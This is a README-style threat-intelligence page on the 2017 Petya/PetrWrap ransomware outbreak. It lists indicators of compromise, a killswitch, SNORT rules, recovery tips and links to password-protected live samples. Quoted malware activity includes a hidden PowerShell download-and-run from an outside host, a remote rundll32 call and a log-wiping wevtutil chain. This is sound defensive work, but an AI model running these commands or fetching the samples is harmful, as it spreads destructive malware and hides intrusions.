@@ -1,0 +1,279 @@
+# petrwrap_sample
+=======
+ransomware,virus_sample,petrwrap,petya
+>>>>>>> 71da0aca13701a19461672b8741216f563f6991d
+#petya #petrWrap
+
+Win32/Diskcoder.Petya.C
+Ransomware attack.
+
+Got new info? Email at netb2c.cn@gmail.com
+
+"it appeared to encrypt a selection of files (PDF and RTF) on two test machines prior to rebooting and encrypting parts of the MFT." - waiting for the details and PoC 
+
+*********** KILLSWITCH // PARTIAL? GOT PROOF - EMAIL!
+Looks like if you block C:\Windows\perfc.dat from writing/executing - stops #Petya. Is used for rundll32 import.
+https://twitter.com/HackingDave/status/879779361364357121
+
+Local kill switch - create file "C:\Windows\perfc"
+It kills WMI vector. Still need to patch MS17-010 for full protection.
+
+Amit Serper (amit@cybereason.com)
+https://twitter.com/0xAmit/status/879764284020064256
+Positive Technologies
+https://twitter.com/ptsecurity/status/879766638731591680
+
+*********** Ransom
+Infected with #Petya? DON'T PAY RANSOM, You wouldn't get your files back. Email used by criminals has been Suspended.
+https://posteo.de/blog/info-zur-ransomware-petrwrappetya-betroffenes-postfach-bereits-seit-mittag-gesperrt
+
+*********** Bitcoin wallet monitoring
+
+https://blockchain.info/address/1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX
+
+*********** Samples:
+https://github.com/netb2c/petrwrap_sample/blob/master/petrwrap_sample/027cc450ef5f8c5f653329641ec1fed9.exe.zip
+https://github.com/netb2c/petrwrap_sample/blob/master/petrwrap_sample/Ci_pBL9wTn-e_O4CKVlChw.zip
+https://github.com/netb2c/petrwrap_sample/blob/master/petrwrap_sample/petya.zip
+https://github.com/netb2c/petrwrap_sample/blob/master/petrwrap_sample/svchost.exe.zip
+Archive password: virus
+
+*********** Source code:
+Archive password: virus
+
+-- svchost.exe: 
+https://yadi.sk/d/TsNv7OGW3KXvmS   // Thanks to the @Sn0wFX_
+-- 027cc450ef5f8c5f653329641ec1fed9.exe in pseudocode:
+https://transfer.sh/m9JMB/027cc450ef5f8c5f653329641ec1fed9.txt
+-- RTF payload data:
+https://transfer.sh/mCshn/data.txt
+
+***********  Initial vector:
+Ukraine «М.Е. Doc» software
+http://blog.antiphish.ru/all/petya-iiv/
+
+*********** Ransomware includes:
+Modified EternalBlue exploit
+A vulnerability in a third-party Ukrainian software product 
+A second SMB network exploit
+
+*********** Origin (NO PROOF):
+Petya was known to be RaaS (Ransomware-as-a-Service), selling on Tor hidden services. Looks like WannaCry copycat. Attribution will be hard.
+https://twitter.com/x0rz/status/879733138792099842
+
+***********  Vulnerabilities/Vectors/Actions:
+MS17-010: https://vulners.com/search?query=ms17-010%20order:published
+
+PSEXEC: %PROGRAMDATA%\dllhost.dat is dropped and is legit PSEXEC bin
+
+Remote WMI, “process call create \"C:\\Windows\\System32\\rundll32.exe \\\"C:\\Windows\\perfc.dat\\\" #1”
+
+Log clean, «wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c:»
+
+Creates a scheduled task that reboots 1 hour after infection. If task removed before the hour, does not reschedule and can buy time
+
+*********** Possible IP addresses:
+185.165.29.78
+84.200.16.242
+111.90.139.247
+95.141.115.108
+
+*********** Email:
+wowsmith123456@posteo.net
+iva76y3pr@outlook.com         // by WhiteWolfCyber
+carmellar4hegp@outlook.com    // by WhiteWolfCyber
+amanda44i8sq@outlook.com      // by WhiteWolfCyber
+
+*********** Malware dropped file:
+http://185.165.29.78/~alex/svchost.exe
+
+*********** Droppers sent via email by WhiteWolfCyber:
+9B853B8FE232B8DED38355513CFD4F30
+CBB9927813FA027AC12D7388720D4771
+22053C34DCD54A5E3C2C9344AB47349A702B8CFDB5796F876AEE1B075A670926
+1FE78C7159DBCB3F59FF8D410BD9191868DEA1B01EE3ECCD82BCC34A416895B5
+EEF090314FBEC77B20E2470A8318FC288B2DE19A23D069FE049F0D519D901B95
+
+***********  Analysis:
+https://virustotal.com/fr/file/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745/analysis/
+
+https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100
+https://www.hybrid-analysis.com/sample/fe2e5d0543b4c8769e401ec216d78a5a3547dfd426fd47e097df04a5f7d6d206?environmentId=100
+https://www.hybrid-analysis.com/sample/ee29b9c01318a1e23836b949942db14d4811246fdae2f41df9f0dcd922c63bc6?environmentId=100
+
+https://twitter.com/PolarToffee/status/879709615675641856
+ 
+*********** Hashes by codexgigas team:
+
+For 185.165.29.78, we have:
+
+a809a63bc5e31670ff117d838522dec433f74bee
+bec678164cedea578a7aff4589018fa41551c27f
+d5bf3f100e7dbcc434d7c58ebf64052329a60fc2
+aba7aa41057c8a6b184ba5776c20f7e8fc97c657
+0ff07caedad54c9b65e5873ac2d81b3126754aac
+51eafbb626103765d3aedfd098b94d0e77de1196
+078de2dc59ce59f503c63bd61f1ef8353dc7cf5f
+
+As droppers
+
+And for 84.200.16.242:
+
+7ca37b86f4acc702f108449c391dd2485b5ca18c
+2bc182f04b935c7e358ed9c9e6df09ae6af47168
+1b83c00143a1bb2bf16b46c01f36d53fb66f82b5
+82920a2ad0138a2a8efc744ae5849c6dde6b435d
+
+*********** Targeted extensions by @GasGeverij
+.3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip.
+
+
+*********** Potential (IOC) (No proof!!!) by Ukraine researchers, received 27th morning
+- - - - - - - - - - - - - - - - - - - - - - -  - 
+
+File Name            Order-20062017.doc       (RTF із CVE-2017-0199)
+MD5 Hash Identifier       415FE69BF32634CA98FA07633F4118E1
+SHA-1 Hash Identifier     101CC1CB56C407D5B9149F2C3B8523350D23BA84
+SHA-256 Hash Identifier                FE2E5D0543B4C8769E401EC216D78A5A3547DFD426FD47E097DF04A5F7D6D206
+File Size                6215 bytes
+File Type              Rich Text Format data
+
+Connects to the host:
+
+84.200.16.242     80
+
+h11p://84.200.16.242/myguy.xls
+
+File Name            myguy.xls
+MD5 Hash Identifier       0487382A4DAF8EB9660F1C67E30F8B25
+SHA-1 Hash Identifier     736752744122A0B5EE4B95DDAD634DD225DC0F73
+SHA-256 Hash Identifier                EE29B9C01318A1E23836B949942DB14D4811246FDAE2F41DF9F0DCD922C63BC6
+File Size                13893 bytes
+File Type              Zip archive data
+
+mshta.exe %WINDIR%\System32\mshta.exe" "C:\myguy.xls.hta" " (PID: 2324)
+powershell.exe -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('h11p://french-cooking.com/myguy.exe', '%APPDATA%\10807.exe');" (PID: 2588, Additional Context: ( System.Net.WebClient).DownloadFile('h11p://french-cooking.com/myguy.exe', '%APPDATA%\10807.exe') ;)
+    10807.exe %APPDATA%\10807.exe" " (PID: 3096)
+
+File Name            BCA9D6.exe
+MD5 Hash Identifier       A1D5895F85751DFE67D19CCCB51B051A
+SHA-1 Hash Identifier     9288FB8E96D419586FC8C595DD95353D48E8A060
+SHA-256 Hash Identifier                17DACEDB6F0379A65160D73C0AE3AA1F03465AE75CB6AE754C7DCB3017AF1FBD
+File Size                275968 bytes
+
+
+!!!! Unproofed
+Connects to the host:
+
+111.90.139.247  80           
+COFFEINOFFICE.XYZ       80
+
+Pay attention - the trojan on which I give the markers could potentially be used to load the encryption part.
+
+
+*********** IOС by Informzachita (infosec.ru)
+
+type,value,comment,to_ids,date
+Payload delivery,md5,"71b6a493388e7d0b40c83ce903bc6b04","",1,20170627
+Payload delivery,sha256,"027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745","",1,20170627
+Payload delivery,sha256,"64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1","https://otx.alienvault.com/pulse/59525e7a95270e240c055ead/",1,20170627
+Payload delivery,sha1,"34f917aaba5684fbe56d3c57d48ef2a1aa7cf06d","",1,20170627
+Payload delivery,malware-sample,"027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745.bin|71b6a493388e7d0b40c83ce903bc6b04","Petya sample",1,20170627
+Payload delivery,filename|sha1,"027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745.bin|34f917aaba5684fbe56d3c57d48ef2a1aa7cf06d","Petya sample",1,20170627
+Payload delivery,filename|sha256,"027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745.bin|027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745","Petya sample",1,20170627
+Payload delivery,filename|md5,"Order-20062017.doc|415fe69bf32634ca98fa07633f4118e1","delivery",0,20170627
+Payload delivery,filename|sha1,"Order-20062017.doc|101cc1cb56c407d5b9149f2c3b8523350d23ba84","delivery",1,20170627
+Payload delivery,filename|sha256,"Order-20062017.doc|fe2e5d0543b4c8769e401ec216d78a5a3547dfd426fd47e097df04a5f7d6d206","delivery",1,20170627
+Payload delivery,vulnerability,"CVE-2017-0199","Order-20062017.doc",0,20170627
+Payload delivery,filename|md5,"myguy.xls|0487382a4daf8eb9660f1c67e30f8b25","",1,20170627
+Payload delivery,filename|sha256,"myguy.xls|ee29b9c01318a1e23836b949942db14d4811246fdae2f41df9f0dcd922c63bc6","",1,20170627
+Payload delivery,sha1,"a809a63bc5e31670ff117d838522dec433f74bee","droppers",1,20170627
+Payload delivery,sha1,"d5bf3f100e7dbcc434d7c58ebf64052329a60fc2","droppers",1,20170627
+Payload delivery,sha1,"aba7aa41057c8a6b184ba5776c20f7e8fc97c657","droppers",1,20170627
+Payload delivery,sha1,"bec678164cedea578a7aff4589018fa41551c27f","droppers",1,20170627
+Payload delivery,sha1,"078de2dc59ce59f503c63bd61f1ef8353dc7cf5f","droppers",1,20170627
+Payload delivery,sha1,"0ff07caedad54c9b65e5873ac2d81b3126754aac","droppers",1,20170627
+Payload delivery,sha1,"51eafbb626103765d3aedfd098b94d0e77de1196","droppers",1,20170627
+Payload delivery,sha1,"82920a2ad0138a2a8efc744ae5849c6dde6b435d","droppers",1,20170627
+Payload delivery,sha1,"1b83c00143a1bb2bf16b46c01f36d53fb66f82b5","droppers",1,20170627
+Payload delivery,sha1,"7ca37b86f4acc702f108449c391dd2485b5ca18c","droppers",1,20170627
+Payload delivery,sha1,"2bc182f04b935c7e358ed9c9e6df09ae6af47168","droppers",1,20170627
+Payload delivery,filename|md5,"BCA9D6.exe|a1d5895f85751dfe67d19cccb51b051a","",1,20170627
+Payload delivery,filename|sha1,"BCA9D6.EXE|9288fb8e96d419586fc8c595dd95353d48e8a060","",1,20170627
+Payload delivery,filename|sha256,"BCA9D6.exe|17dacedb6f0379a65160d73c0ae3aa1f03465ae75cb6ae754c7dcb3017af1fbd","",1,20170627
+Payload installation,filename|sha1,"myguy.xls|736752744122a0b5ee4b95ddad634dd225dc0f73","",1,20170627
+Payload delivery,filename,"dllhost.dat","",1,20170627
+External analysis,filename|sha1,"myguy.exe|9288fb8e96d419586fc8c595dd95353d48e8a060","",1,20170627
+External analysis,filename|sha256,"myguy.exe|17dacedb6f0379a65160d73c0ae3aa1f03465ae75cb6ae754c7dcb3017af1fbd","",1,20170627
+External analysis,malware-sample,"myguy.exe|a1d5895f85751dfe67d19cccb51b051a","",1,20170627
+External analysis,malware-sample,"svchost.exe|d2ec63b63e88ece47fbaab1ca22da1ef","possible sample",1,20170627
+External analysis,filename|sha256,"svchost.exe|e5c643f1d8ecc0fd739d0bbe4a1c6c7de2601d86ab0fff74fd89c40908654be5","possible sample",1,20170627
+External analysis,filename|sha1,"svchost.exe|dd52fcc042a44a2af9e43c15a8e520b54128cdc8","possible sample",1,20170627
+Network activity,url,"http://185.165.29.78/~alex/svchost.exe","",1,20170627
+Network activity,url,"http://84.200.16.242/myguy.xls","",1,20170627
+Network activity,ip-dst|port,"84.200.16.242|80","Order-20062017.doc",1,20170627
+Network activity,email-dst,"wowsmith123456@posteo.net","",1,20170627
+Network activity,url,"http://french-cooking.com/myguy.exe","",1,20170627
+Network activity,ip-dst|port,"111.90.139.247|80","",1,20170627
+Network activity,domain,"coffeinoffice.xyz","",1,20170627
+Network activity,ip-dst,"95.141.115.108","https://twitter.com/JC_DiazGarcia/status/879719578171060228",1,20170627
+Network activity,ip-dst,"84.200.16.242","https://twitter.com/JC_DiazGarcia/status/879719578171060228",1,20170627
+Network activity,ip-dst,"111.90.139.247","https://twitter.com/JC_DiazGarcia/status/879719578171060228",1,20170627
+Network activity,ip-dst,"185.165.29.78","https://twitter.com/JC_DiazGarcia/status/879719578171060228",1,20170627
+Artifacts dropped,filename,"%WINDIR%\perfc.dat","",1,20170627
+Artifacts dropped,filename,"C:\myguy.xls.hta","",1,20170627
+Artifacts dropped,filename,"%APPDATA%\10807.exe","",1,20170627
+Financial fraud,btc,"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX","",0,20170627
+External analysis,vulnerability,"CVE-2017-0144","",0,20170627
+External analysis,comment,"attack-vector:phishing","",0,20170627
+
+*********** SNORT rules for the detection by Positive Technologies (ptsecurity.com):
+
+alert tcp any any -> $HOME_NET 445 (msg: "[PT Open] Unimplemented Trans2 Sub-Command code. Possible ETERNALBLUE (WannaCry, Petya) tool"; flow: to_server, established; content: "|FF|SMB2|00 00 00 00|"; depth: 9; offset: 4; byte_test: 2, >, 0x0008, 52, relative, little; pcre: "/\xFFSMB2\x00\x00\x00\x00.{52}(?:\x04|\x09|\x0A|\x0B|\x0C|\x0E|\x11)\x00/"; flowbits: set, SMB.Trans2.SubCommand.Unimplemented; reference: url, msdn.microsoft.com/en-us/library/ee441654.aspx; classtype: attempted-admin; sid: 10001254; rev: 2;)
+
+alert tcp any any -> $HOME_NET 445 (msg: "[PT Open] ETERNALBLUE (WannaCry, Petya) SMB MS Windows RCE"; flow: to_server, established; content: "|FF|SMB3|00 00 00 00|"; depth: 9; offset: 4; flowbits: isset, SMB.Trans2.SubCommand.Unimplemented.Code0E; threshold: type limit, track by_src, seconds 60, count 1; reference: cve, 2017-0144; classtype: attempted-admin; sid: 10001255; rev: 3;)
+
+alert tcp any any -> $HOME_NET 445 (msg: "[PT Open] Trans2 Sub-Command 0x0E. Likely ETERNALBLUE (WannaCry, Petya) tool"; flow: to_server, established; content: "|FF|SMB2|00 00 00 00|"; depth: 9; offset: 4; content: "|0E 00|"; distance: 52; within: 2; flowbits: set, SMB.Trans2.SubCommand.Unimplemented.Code0E; reference: url, msdn.microsoft.com/en-us/library/ee441654.aspx; classtype: attempted-admin; sid: 10001256; rev: 2;)
+
+alert tcp any any -> $HOME_NET 445 (msg: "[PT Open] Petya ransomware perfc.dat component"; flow: to_server, established, no_stream; content: "|fe 53 4d 42|"; offset: 4; depth: 4; content: "|05 00|"; offset: 16; depth: 2; byte_jump: 2, 112, little, from_beginning, post_offset 4; content: "|70 00 65 00 72 00 66 00 63 00 2e 00 64 00 61 00 74 00|"; distance:0; classtype:suspicious-filename-detect; sid: 10001443; rev: 1;)
+
+alert tcp any any -> $HOME_NET 445 (msg:"[PT Open] SMB2 Create PSEXESVC.EXE"; flow:to_server, established, no_stream; content: "|fe 53 4d 42|"; offset: 4; depth: 4; content: "|05 00|"; offset: 16; depth: 2; byte_jump: 2, 112, little, from_beginning, post_offset 4; content:"|50 00 53 00 45 00 58 00 45 00 53 00 56 00 43 00 2e 00 45 00 58 00 45|"; distance:0; classtype:suspicious-filename-detect; sid: 10001444; rev:1;)
+
+
+*********** Has sysinternal utilities signature
+https://twitter.com/ppeepuppy/status/879706271535972353
+ 
+*********** Uses the The GetExtendedTcpTable function to get a list of available endpoints
+https://twitter.com/pjcampbe11/status/879709929073979392
+ 
+*********** List of extensions targeted
+https://twitter.com/MrCarlMcDade/status/879706580127809536
+
+*********** Indicates possible usage of PSEXEC, on windows that means the admin$ and c$ shares.
+https://twitter.com/rikvduijn/status/879726410201526272
+
+*********** It is confirmed that the sample 027cc... contains PSEXEC:
+https://twitter.com/NVISO_Labs/status/879724733696274432
+
+*********** Friends in Ukraine are telling me this helps to recover from Petya (untested):
+https://twitter.com/msuiche/status/879722894997278720
+bootrec /RebuildBcd
+bootrec /fixMbr
+bootrec /fixboot
+
+*********** Fix suggest by @MrAdz350
+If you can boot to a Windows ISO prior to Frist reboot you can use bootrec tool to prevent MBR overwriting as per https://neosmart.net/wiki/fix-mbr
+
+*********** Petya— Enhanced WannaCry? What we know so far.
+https://blog.comae.io/byata-enhanced-wannacry-a3ddd6c8dabb
+
+*********** Found evidences of post kernel exploitation too: IA32_SYSENTER_EIP after decoding kernel shellcode
+https://twitter.com/msuiche/status/879713211368525824
+
+***********  #Petya uses long #sleep functions: if infected you have 30-40 mins to turn off your computer to save it from ransom.
+https://twitter.com/GroupIB_GIB/status/879736598535032832
+
+***********  #Petya uses LSADump to get Admin password and infect all network. There is no need for #EternalBlue vulnerable PCs.
+https://twitter.com/GroupIB_GIB/status/879772068300165120
+
+
